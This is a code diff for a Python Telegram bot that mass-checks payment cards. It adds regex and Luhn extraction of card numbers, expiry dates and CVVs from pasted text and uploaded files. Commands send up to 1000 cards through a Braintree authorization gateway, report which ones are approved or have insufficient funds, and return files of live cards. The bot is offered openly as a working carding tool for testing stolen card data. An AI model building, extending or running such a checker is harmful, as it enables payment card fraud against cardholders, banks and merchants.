@@ -1,10 +1,11 @@
-# Independent Telegram Bot for Card Checking with Mass Check Features
+# Independent Telegram Bot for Card Checking with Smart Card Extraction
 import time
 import os
 import asyncio
 import aiofiles
 import random
 import aiohttp
+import re
 from aiogram import Router, types
 from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.filters import Command
@@ -28,6 +29,144 @@ approved_keywords = [
     'Insufficient Funds',
     'APPROVED'
 ]
+
+def extract_cards_from_text(text):
+    """
+    Extract valid card strings from mixed text using advanced regex and Luhn validation.
+    Supports formats: 4111111111111111|12|2025|123 or 4111111111111111 12 2025 123
+    Returns list of validated cards in standard format.
+    """
+    # Advanced regex patterns for different card formats
+    patterns = [
+        # Standard format with pipes: 4111111111111111|12|2025|123
+        re.compile(r'\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b'),
+        
+        # Space separated: 4111111111111111 12 2025 123
+        re.compile(r'\b(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})\b'),
+        
+        # Mixed separators: 4111111111111111|12 2025|123
+        re.compile(r'\b(\d{13,19})[\s|]+(\d{1,2})[\s|]+(\d{2,4})[\s|]+(\d{3,4})\b'),
+        
+        # With slashes: 4111111111111111/12/2025/123
+        re.compile(r'\b(\d{13,19})/(\d{1,2})/(\d{2,4})/(\d{3,4})\b'),
+        
+        # With dashes: 4111111111111111-12-2025-123
+        re.compile(r'\b(\d{13,19})-(\d{1,2})-(\d{2,4})-(\d{3,4})\b'),
+        
+        # With dots: 4111111111111111.12.2025.123
+        re.compile(r'\b(\d{13,19})\.(\d{1,2})\.(\d{2,4})\.(\d{3,4})\b'),
+        
+        # With colons: 4111111111111111:12:2025:123
+        re.compile(r'\b(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})\b')
+    ]
+    
+    def luhn_checksum(card_number):
+        """Calculate Luhn checksum for card validation"""
+        def digits_of(n):
+            return [int(d) for d in str(n)]
+        
+        digits = digits_of(card_number)
+        odd_digits = digits[-1::-2]
+        even_digits = digits[-2::-2]
+        checksum = sum(odd_digits)
+        
+        for d in even_digits:
+            checksum += sum(digits_of(d * 2))
+        
+        return checksum % 10
+
+    def is_luhn_valid(card_number):
+        """Validate card number using Luhn algorithm"""
+        return luhn_checksum(card_number) == 0
+    
+    def is_valid_card_brand(card_number):
+        """Check if card number belongs to known card brands"""
+        # Visa: starts with 4
+        if card_number.startswith('4') and len(card_number) in [13, 16, 19]:
+            return True
+        # Mastercard: starts with 5 or 2221-2720
+        elif card_number.startswith('5') and len(card_number) == 16:
+            return True
+        elif card_number.startswith('2') and len(card_number) == 16:
+            prefix = int(card_number[:4])
+            if 2221 <= prefix <= 2720:
+                return True
+        # American Express: starts with 34 or 37
+        elif card_number.startswith(('34', '37')) and len(card_number) == 15:
+            return True
+        # Discover: starts with 6
+        elif card_number.startswith('6') and len(card_number) == 16:
+            return True
+        # Diners Club: starts with 30, 36, 38
+        elif card_number.startswith(('30', '36', '38')) and len(card_number) == 14:
+            return True
+        # JCB: starts with 35
+        elif card_number.startswith('35') and len(card_number) == 16:
+            return True
+        
+        return False
+
+    valid_cards = []
+    processed_cards = set()  # Avoid duplicates
+    
+    # Try all patterns
+    for pattern in patterns:
+        matches = pattern.finditer(text)
+        
+        for match in matches:
+            card_number = match.group(1)
+            month = match.group(2)
+            year = match.group(3)
+            cvv = match.group(4)
+            
+            # Skip if already processed
+            card_key = f"{card_number}|{month}|{year}|{cvv}"
+            if card_key in processed_cards:
+                continue
+                
+            processed_cards.add(card_key)
+            
+            # Normalize year (handle 2-digit years)
+            if len(year) == 2:
+                current_year = int(str(time.time())[:4])
+                year_int = int(year)
+                if year_int < 50:  # Assume 20xx for years < 50
+                    year = f"20{year}"
+                else:  # Assume 19xx for years >= 50
+                    year = f"19{year}"
+            
+            # Validate all components
+            try:
+                month_int = int(month)
+                year_int = int(year)
+                cvv_len = len(cvv)
+                
+                # Basic validation
+                if not (1 <= month_int <= 12):
+                    continue
+                if not (2020 <= year_int <= 2040):  # Reasonable year range
+                    continue
+                if cvv_len not in (3, 4):
+                    continue
+                if not (13 <= len(card_number) <= 19):
+                    continue
+                
+                # Advanced validation
+                if not card_number.isdigit():
+                    continue
+                if not is_valid_card_brand(card_number):
+                    continue
+                if not is_luhn_valid(card_number):
+                    continue
+                
+                # Format and add to valid cards
+                formatted_card = f"{card_number}|{month.zfill(2)}|{year}|{cvv}"
+                valid_cards.append(formatted_card)
+                
+            except ValueError:
+                continue
+    
+    return valid_cards
 
 def validate_card_format(card: str):
     """
@@ -77,52 +216,91 @@ async def check_single_card(card: str):
     except Exception as e:
         return False, f"Network Error: {str(e)}", False
 
-@router.message(Command("b3"))
-async def b3_command(message: Message):
+@router.message(Command("chk"))
+async def chk_command(message: Message):
+    """Enhanced single card check with smart extraction"""
     now = time.time()
-
-    # Get user input and accept both "|" separated or space-separated formats.
-    args = message.text.split(" ", 1)
-    if len(args) < 2:
-        await message.reply(
-            "<b>❌ Provide card in</b> <code>number|month|year|cvv</code> or <code>number month year cvv</code> format.",
-            parse_mode="HTML"
-        )
-        return
-
-    # Normalize input: replace pipes with spaces and split into parts
-    card_parts = args[1].replace("|", " ").split()
-    if len(card_parts) != 4:
-        await message.reply(
-            "<b>❌ Provide card in</b> <code>number|month|year|cvv</code> or <code>number month year cvv</code> format.",
-            parse_mode="HTML"
-        )
-        return
-
-    card_number, month, year, cvv = card_parts
-
-    # Normalize year: if it is two digits, assume 20XX
-    if len(year) == 2:
-        year = "20" + year
-
-    # Reassemble card string in the standard format
-    card = f"{card_number}|{month}|{year}|{cvv}"
-
+    
+    # Check if this is a reply to a message
+    input_text = ""
+    if message.reply_to_message:
+        # Extract from replied message
+        input_text = message.reply_to_message.text or message.reply_to_message.caption or ""
+        # Also check command arguments
+        args = message.text.split(" ", 1)
+        if len(args) > 1:
+            input_text += " " + args[1]
+    else:
+        # Get from command arguments
+        args = message.text.split(" ", 1)
+        if len(args) < 2:
+            await message.reply(
+                "<b>❌ Usage:</b>\n"
+                "• <code>/chk 4111111111111111|12|2025|123</code>\n"
+                "• <code>/chk 4111111111111111 12 2025 123</code>\n"
+                "• Reply to a message containing card details with <code>/chk</code>\n"
+                "• <code>/chk</code> with card mixed in text",
+                parse_mode="HTML"
+            )
+            return
+        input_text = args[1]
+    
+    # Extract cards using smart regex
+    extracted_cards = extract_cards_from_text(input_text)
+    
+    if not extracted_cards:
+        # Fallback to manual parsing if no cards found
+        args = message.text.split(" ", 1)
+        if len(args) >= 2:
+            # Try manual parsing
+            card_parts = args[1].replace("|", " ").split()
+            if len(card_parts) == 4:
+                card_number, month, year, cvv = card_parts
+                if len(year) == 2:
+                    year = "20" + year
+                card = f"{card_number}|{month}|{year}|{cvv}"
+                extracted_cards = [card]
+        
+        if not extracted_cards:
+            await message.reply(
+                "<b>❌ No valid cards found!</b>\n\n"
+                "<b>Supported formats:</b>\n"
+                "• <code>4111111111111111|12|2025|123</code>\n"
+                "• <code>4111111111111111 12 2025 123</code>\n"
+                "• <code>4111111111111111/12/2025/123</code>\n"
+                "• <code>4111111111111111-12-2025-123</code>\n"
+                "• Mixed with other text",
+                parse_mode="HTML"
+            )
+            return
+    
+    # Use first extracted card
+    card = extracted_cards[0]
+    
+    # Show extraction info if multiple cards found
+    extraction_info = ""
+    if len(extracted_cards) > 1:
+        extraction_info = f"\n<b>🔍 Found {len(extracted_cards)} cards, checking first one</b>\n"
+    
     # Validate card format
     is_valid, error_msg = validate_card_format(card)
     if not is_valid:
         await message.reply(error_msg, parse_mode="HTML")
         return
-
-    # Send a "Processing..." message
-    processing_message = await message.reply("<b>Processing your request...</b>", parse_mode="HTML")
-
+    
+    # Send processing message
+    processing_message = await message.reply(
+        f"<b>🔍 Card Detected!</b>{extraction_info}\n"
+        f"<b>Processing:</b> <code>{card}</code>", 
+        parse_mode="HTML"
+    )
+    
     success, response_text, is_approved = await check_single_card(card)
     
     if success:
-        # Extract BIN info from the card number (first 6 digits)
-        bin_number = card_number[:6]
-        bin_data = await get_bin_details(bin_number)
+        card_number = card.split("|")[0]
+        # Extract BIN info
+        bin_data = await get_bin_details(card_number[:6])
         bank_name, card_type, brand, issuer, country_name, country_flag, level = bin_data
 
         if is_approved or "APPROVED" in response_text:
@@ -155,7 +333,6 @@ async def b3_command(message: Message):
 𝗧𝗶𝗺𝗲: {round(time.time() - now, 2)} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
 """
 
-        # Edit the "Processing..." message with the result
         await processing_message.edit_text(reply_text, parse_mode="HTML")
     else:
         await processing_message.edit_text(
@@ -163,69 +340,98 @@ async def b3_command(message: Message):
             parse_mode="HTML"
         )
 
+@router.message(Command("b3"))
+async def b3_command(message: Message):
+    """Alias for /chk command"""
+    await chk_command(message)
+
 @router.message(Command("mchk"))
 async def mchk_command(message: Message):
-    """Mass check up to 10 cards"""
+    """Enhanced mass check with smart extraction (up to 20 cards)"""
     user_id = message.from_user.id
     
-    # Extract cards after command
-    args = message.text.split(" ", 1)
-    if len(args) < 2:
+    # Get input text from command or reply
+    input_text = ""
+    if message.reply_to_message:
+        input_text = message.reply_to_message.text or message.reply_to_message.caption or ""
+        args = message.text.split(" ", 1)
+        if len(args) > 1:
+            input_text += " " + args[1]
+    else:
+        args = message.text.split(" ", 1)
+        if len(args) < 2:
+            await message.reply(
+                "<b>❌ Usage:</b>\n"
+                "• <code>/mchk card1|mm|yyyy|cvv card2|mm|yyyy|cvv</code>\n"
+                "• Reply to a message with cards using <code>/mchk</code>\n"
+                "• Supports mixed text with multiple card formats\n"
+                "• Maximum 20 cards per check",
+                parse_mode="HTML"
+            )
+            return
+        input_text = args[1]
+    
+    # Extract cards using smart regex
+    extracted_cards = extract_cards_from_text(input_text)
+    
+    # Fallback to manual parsing if no smart extraction
+    if not extracted_cards and not message.reply_to_message:
+        lines = input_text.strip().split('\n')
+        for line in lines:
+            line = line.strip()
+            if line:
+                card_parts = line.replace("|", " ").split()
+                if len(card_parts) == 4:
+                    card_number, month, year, cvv = card_parts
+                    if len(year) == 2:
+                        year = "20" + year
+                    card = f"{card_number}|{month}|{year}|{cvv}"
+                    if validate_card_format(card)[0]:
+                        extracted_cards.append(card)
+    
+    if not extracted_cards:
         await message.reply(
-            "Please provide cards to check, one per line, like:\n"
-            "<code>/mchk 4111111111111111|12|2025|123\n4222222222222222|11|2024|456</code>",
+            "<b>❌ No valid cards found!</b>\n\n"
+            "<b>Supported formats:</b>\n"
+            "• <code>4111111111111111|12|2025|123</code>\n"
+            "• <code>4111111111111111 12 2025 123</code>\n"
+            "• Multiple cards on separate lines\n"
+            "• Mixed with other text",
             parse_mode="HTML"
         )
         return
     
-    cards_text = args[1].strip()
-    cards = [line.strip() for line in cards_text.splitlines() if line.strip()]
-    
-    if len(cards) > 10:
-        await message.reply("❌ You can check a maximum of 10 cards at once.", parse_mode="HTML")
-        return
-    
-    if not cards:
-        await message.reply("❌ No valid cards found to check.", parse_mode="HTML")
+    if len(extracted_cards) > 20:
+        await message.reply(
+            f"<b>❌ Too many cards found: {len(extracted_cards)}</b>\n"
+            f"Maximum allowed: 20 cards per check.",
+            parse_mode="HTML"
+        )
         return
     
     # Initialize stop flag
     stop_flags[user_id] = False
     
-    processing_message = await message.reply("<b>Processing your cards... ⏳</b>", parse_mode="HTML")
+    processing_message = await message.reply(
+        f"<b>🔍 Extraction Complete!</b>\n"
+        f"<b>Found:</b> {len(extracted_cards)} valid cards\n"
+        f"<b>Processing...</b> ⏳", 
+        parse_mode="HTML"
+    )
     
     results = ""
     approved_count = 0
     declined_count = 0
     
-    for i, card_line in enumerate(cards, 1):
+    for i, card in enumerate(extracted_cards, 1):
         if stop_flags.get(user_id, False):
             results += "⚠️ <b>Checking stopped by user</b>\n\n"
             break
         
         try:
-            # Normalize card format
-            card_parts = card_line.replace("|", " ").split()
-            if len(card_parts) != 4:
-                results += f"❌ <b>Invalid format:</b> <code>{card_line}</code>\n\n"
-                continue
-            
-            card_number, month, year, cvv = card_parts
-            
-            # Normalize year
-            if len(year) == 2:
-                year = "20" + year
-            
-            card = f"{card_number}|{month}|{year}|{cvv}"
-            
-            # Validate card
-            is_valid, error_msg = validate_card_format(card)
-            if not is_valid:
-                results += f"❌ <b>Invalid card:</b> <code>{card_line}</code>\n{error_msg}\n\n"
-                continue
-            
             # Check card
             success, response_text, is_approved = await check_single_card(card)
+            card_number = card.split("|")[0]
             
             # Get BIN info
             bin_data = await get_bin_details(card_number[:6])
@@ -251,24 +457,24 @@ async def mchk_command(message: Message):
 
 """
         except Exception as e:
-            results += f"❌ <b>Error with card:</b> <code>{card_line}</code>\n<b>Reason:</b> {str(e)}\n\n"
+            results += f"❌ <b>Error with card:</b> <code>{card}</code>\n<b>Reason:</b> {str(e)}\n\n"
         
         # Update progress
-        progress_text = f"<b>Processing cards... ⏳ ({i}/{len(cards)})</b>\n\n{results}"
+        progress_text = f"<b>🔍 Mass Check ⏳ ({i}/{len(extracted_cards)})</b>\n\n{results}"
         try:
             await processing_message.edit_text(progress_text, parse_mode="HTML")
         except:
-            pass  # Ignore message too long errors during progress updates
+            pass
         
-        await asyncio.sleep(1)  # Small delay between requests
+        await asyncio.sleep(1)
     
     # Final summary
     summary = f"""
 <b>✅ Mass Check Complete!</b>
 
 <b>📊 Summary:</b>
-• Total Checked: {len(cards)}
-• Approved: {approved_count} ✅
+• Cards Found: {len(extracted_cards)} 🔍
+• Approved: {approved_count} ✅  
 • Declined: {declined_count} ❌
 
 {results}
@@ -277,17 +483,15 @@ async def mchk_command(message: Message):
     try:
         await processing_message.edit_text(summary, parse_mode="HTML")
     except:
-        # If message is too long, send summary separately
         await processing_message.edit_text(
             f"<b>✅ Mass Check Complete!</b>\n\n"
             f"<b>📊 Summary:</b>\n"
-            f"• Total Checked: {len(cards)}\n"
-            f"• Approved: {approved_count} ✅\n"
+            f"• Cards Found: {len(extracted_cards)} 🔍\n"
+            f"• Approved: {approved_count} ✅\n"  
             f"• Declined: {declined_count} ❌",
             parse_mode="HTML"
         )
         
-        # Send detailed results in chunks if needed
         if results:
             chunk_size = 4000
             for i in range(0, len(results), chunk_size):
@@ -296,13 +500,17 @@ async def mchk_command(message: Message):
 
 @router.message(Command("mtxt"))
 async def mtxt_command(message: Message):
-    """Mass check from text file"""
+    """Enhanced mass check from text file with smart extraction"""
     user_id = message.from_user.id
     
     if not message.reply_to_message or not message.reply_to_message.document:
         await message.reply(
-            "❌ Please reply to a text file (.txt) containing cards to check.\n"
-            "Format: one card per line as <code>number|month|year|cvv</code>",
+            "<b>❌ Reply to a text file (.txt)</b>\n\n"
+            "<b>Smart features:</b>\n"
+            "• Automatically extracts cards from mixed text\n"
+            "• Supports multiple formats (|, space, /, -, etc.)\n"
+            "• Luhn algorithm validation\n"
+            "• Brand detection (Visa, MC, Amex, etc.)",
             parse_mode="HTML"
         )
         return
@@ -312,72 +520,78 @@ async def mtxt_command(message: Message):
         await message.reply("❌ Please reply to a valid <code>.txt</code> file.", parse_mode="HTML")
         return
     
-    # Download file
+    # Download and process file
     file_path = f"downloads/{user_id}_{int(time.time())}.txt"
     os.makedirs("downloads", exist_ok=True)
     
     try:
         await message.reply_to_message.download(destination=file_path)
-    except Exception as e:
-        await message.reply(f"❌ Error downloading file: {str(e)}", parse_mode="HTML")
-        return
-    
-    # Read cards from file
-    try:
+        
         async with aiofiles.open(file_path, mode='r', encoding='utf-8') as f:
             content = await f.read()
-            cards = [line.strip() for line in content.splitlines() if line.strip()]
+            
+        # Smart extraction from file content
+        extracted_cards = extract_cards_from_text(content)
+        
     except Exception as e:
-        await message.reply(f"❌ Error reading file: {str(e)}", parse_mode="HTML")
-        if os.path.exists(file_path):
-            os.remove(file_path)
+        await message.reply(f"❌ Error processing file: {str(e)}", parse_mode="HTML")
         return
     finally:
         if os.path.exists(file_path):
             os.remove(file_path)
     
-    if not cards:
-        await message.reply("❌ No valid cards found in the file.", parse_mode="HTML")
+    if not extracted_cards:
+        await message.reply(
+            "<b>❌ No valid cards found in file!</b>\n\n"
+            "<b>Supported formats:</b>\n"
+            "• <code>4111111111111111|12|2025|123</code>\n"
+            "• <code>4111111111111111 12 2025 123</code>\n"
+            "• <code>4111111111111111/12/2025/123</code>\n"
+            "• Cards mixed with other text",
+            parse_mode="HTML"
+        )
         return
     
-    if len(cards) > 1000:  # Reasonable limit
-        await message.reply(f"❌ Too many cards. Maximum allowed: 1000. Found: {len(cards)}", parse_mode="HTML")
+    if len(extracted_cards) > 1000:
+        await message.reply(
+            f"<b>❌ Too many cards: {len(extracted_cards)}</b>\n"
+            f"Maximum allowed: 1000 cards per file.",
+            parse_mode="HTML"
+        )
         return
+    
+    # Show extraction summary
+    await message.reply(
+        f"<b>🔍 Extraction Complete!</b>\n\n"
+        f"<b>📊 Extraction Summary:</b>\n"
+        f"• Cards Found: {len(extracted_cards)}\n"
+        f"• All cards validated with Luhn algorithm ✓\n"
+        f"• Starting mass check...",
+        parse_mode="HTML"
+    )
     
     # Initialize tracking
     stop_flags[user_id] = False
     approved, declined, errors = [], [], []
-    total_cards = len(cards)
+    total_cards = len(extracted_cards)
     
     # Create progress keyboard
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔄 Card: Waiting...", callback_data="none")],
+        [InlineKeyboardButton(text="🔄 Card: Starting...", callback_data="none")],
         [InlineKeyboardButton(text="⏳ Response: Waiting...", callback_data="none")],
         [InlineKeyboardButton(text="✅ Approved: 0", callback_data="none")],
         [InlineKeyboardButton(text="❌ Declined: 0", callback_data="none")],
-        [InlineKeyboardButton(text=f"📊 Total Cards: {total_cards}", callback_data="none")]
+        [InlineKeyboardButton(text=f"🔍 Found: {total_cards}", callback_data="none")]
     ])
     
-    progress_msg = await message.reply(f"Processing cards: 0/{total_cards}", reply_markup=keyboard)
+    progress_msg = await message.reply(f"processing: 0/{total_cards}", reply_markup=keyboard)
     
-    for index, card_line in enumerate(cards, 1):
+    for index, card in enumerate(extracted_cards, 1):
         if stop_flags.get(user_id, False):
             break
         
         try:
-            # Normalize and validate card
-            card_parts = card_line.replace("|", " ").split()
-            if len(card_parts) != 4:
-                errors.append(f"{card_line} , response: Invalid format")
-                continue
-            
-            card_number, month, year, cvv = card_parts
-            
-            # Normalize year
-            if len(year) == 2:
-                year = "20" + year
-            
-            card = f"{card_number}|{month}|{year}|{cvv}"
+            card_number = card.split("|")[0]
             
             # Update progress display
             keyboard.inline_keyboard[0][0].text = f"🔄 Card: {card_number[:6]}...{card_number[-4:]}"
@@ -386,15 +600,9 @@ async def mtxt_command(message: Message):
             keyboard.inline_keyboard[3][0].text = f"❌ Declined: {len(declined)}"
             
             try:
-                await progress_msg.edit_text(f"Processing cards: {index-1}/{total_cards}", reply_markup=keyboard)
+                await progress_msg.edit_text(f" processing: {index-1}/{total_cards}", reply_markup=keyboard)
             except:
                 pass
-            
-            # Validate card format
-            is_valid, error_msg = validate_card_format(card)
-            if not is_valid:
-                errors.append(f"{card_line} , response: {error_msg}")
-                continue
             
             # Check card
             success, response_text, is_approved = await check_single_card(card)
@@ -407,7 +615,7 @@ async def mtxt_command(message: Message):
                 if is_approved:
                     approved.append(f"{card} , response: {response_text}")
                     
-                    # Send individual approved card notification
+                    # Send individual notification
                     notification = f"""
 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
 
@@ -423,57 +631,65 @@ async def mtxt_command(message: Message):
                 else:
                     declined.append(f"{card} , response: {response_text}")
                 
-                # Update response in keyboard
-                short_response = (response_text[:37] + "...") if len(response_text) > 40 else response_text
-                keyboard.inline_keyboard[1][0].text = f"{'✅' if is_approved else '❌'} Response: {short_response}"
+                # Update response display
+                short_response = (response_text[:35] + "...") if len(response_text) > 38 else response_text
+                keyboard.inline_keyboard[1][0].text = f"{'✅' if is_approved else '❌'} {short_response}"
             else:
                 errors.append(f"{card} , response: {response_text}")
                 keyboard.inline_keyboard[1][0].text = f"❌ Response: Error"
         
         except Exception as e:
-            errors.append(f"{card_line} , response: Error: {str(e)}")
+            errors.append(f"{card} , response: Exception: {str(e)}")
             keyboard.inline_keyboard[1][0].text = f"❌ Response: Exception"
         
-        # Update final counts
+        # Update counts
         keyboard.inline_keyboard[2][0].text = f"✅ Approved: {len(approved)}"
         keyboard.inline_keyboard[3][0].text = f"❌ Declined: {len(declined)}"
         
         try:
-            await progress_msg.edit_text(f"Processing cards: {index}/{total_cards}", reply_markup=keyboard)
+            await progress_msg.edit_text(f" processing: {index}/{total_cards}", reply_markup=keyboard)
         except:
             pass
         
-        await asyncio.sleep(2)  # Delay between requests
+        await asyncio.sleep(2)
     
-    # Final update
-    await progress_msg.edit_text("✅ Done Checking Cards!", reply_markup=keyboard)
+    # Final summary
+    await progress_msg.edit_text("✅  Processing Complete!", reply_markup=keyboard)
     
-    # Send summary
     total_checked = len(approved) + len(declined) + len(errors)
     summary_text = f"""
-<b>✅ File Check Complete!</b>
+<b>🔍  File Check Complete!</b>
 
 <b>📊 Final Summary:</b>
+•  Extracted: {total_cards}
 • Total Checked: {total_checked}
 • Approved: {len(approved)} 🟢
-• Declined: {len(declined)} 🔴
+• Declined: {len(declined)} 🔴  
 • Errors: {len(errors)} ⚠️
+
+<b>🧠  Features Used:</b>
+• Luhn Algorithm Validation ✓
+• Multi-Format Detection ✓
+• Brand Validation ✓
+• Duplicate Removal ✓
 """
     
     await message.reply(summary_text, parse_mode="HTML")
     
-    # Generate and send result files
+    # Generate result files
     for name, lst in [("approved", approved), ("declined", declined), ("errors", errors)]:
         if lst:
-            filename = f"{name}_{user_id}_{random.randint(100000, 999999)}.txt"
+            filename = f"smart_{name}_{user_id}_{random.randint(100000, 999999)}.txt"
             try:
                 async with aiofiles.open(filename, mode='w', encoding='utf-8') as f:
+                    await f.write(f"# Smart Extracted {name.title()} Cards\n")
+                    await f.write(f"# Total: {len(lst)}\n\n")
                     await f.write("\n".join(lst))
                 
                 with open(filename, 'rb') as doc:
                     await message.reply_document(
                         document=doc,
-                        caption=f"<b>{name.title()} Cards ({len(lst)})</b>",
+                        caption=f"<b>🔍 {name.title()} Cards ({len(lst)})</b>",
                         parse_mode="HTML"
                     )
                 
@@ -487,3 +703,44 @@ async def stop_command(message: Message):
     user_id = message.from_user.id
     stop_flags[user_id] = True
     await message.reply("⚠️ <b>Stopping check...</b> Will halt after current card.", parse_mode="HTML")
+
+@router.message(Command("help"))
+async def help_command(message: Message):
+    """Show help information"""
+    help_text = """
+<b>🤖 sexy Card Checker Bot</b>
+
+<b>🔍 Commands:</b>
+• <code>/chk</code> - sexy single card check
+• <code>/b3</code> - Alias for /chk
+• <code>/mchk</code> - sexy mass check (up to 20 cards)
+• <code>/mtxt</code> - sexy file processing (up to 1000 cards)
+• <code>/stop</code> - Stop ongoing checks
+
+<b>🧠 sexy Features:</b>
+• Auto-extracts cards from mixed text
+• Supports multiple formats (|, space, /, -, :, .)
+• Luhn algorithm validation
+• Brand detection (Visa, MC, Amex, Discover, etc.)
+• Reply to messages with cards
+• Duplicate removal
+• Progress tracking
+
+<b>📋 Supported Formats:</b>
+• <code>4111111111111111|12|2025|123</code>
+• <code>4111111111111111 12 2025 123</code>
+• <code>4111111111111111/12/2025/123</code>
+• <code>4111111111111111-12-2025-123</code>
+• <code>4111111111111111:12:2025:123</code>
+• <code>4111111111111111.12.2025.123</code>
+
+<b>💡 Usage Examples:</b>
+• <code>/chk 4111111111111111|12|25|123</code>
+• Reply to any message and use <code>/chk</code>
+• <code>/mchk</code> with multiple cards
+• <code>/mtxt</code> reply to .txt file
+
+<b>🚀 Gateway:</b> Braintree Auth
+<b>⚡ Speed:</b> sexy extraction + validation
+"""
+    await message.reply(help_text, parse_mode="HTML")
